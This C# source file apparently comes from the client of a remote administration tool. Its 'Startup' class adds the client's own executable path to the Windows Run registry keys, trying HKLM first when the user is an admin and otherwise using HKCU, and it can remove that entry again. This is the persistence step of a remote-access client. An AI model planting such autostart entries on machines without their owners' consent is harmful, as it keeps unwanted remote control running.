using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;

namespace xClient.Core.Installation
{
    public static class Startup
    {
        // ReSharper disable InconsistentNaming
        private static string GetHKLMPath()
        {
            return (PlatformHelper.Is64Bit)
                ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        }

        public static bool AddToStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
                    Settings.STARTUPKEY, ClientData.CurrentPath, true);

                if (success) return true;

                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                    true);
            }
            else
            {
                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                    true);
            }
        }

        public static bool RemoveFromStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
                    Settings.STARTUPKEY);

                if (success) return true;

                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
            else
            {
                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
        }
    }
}
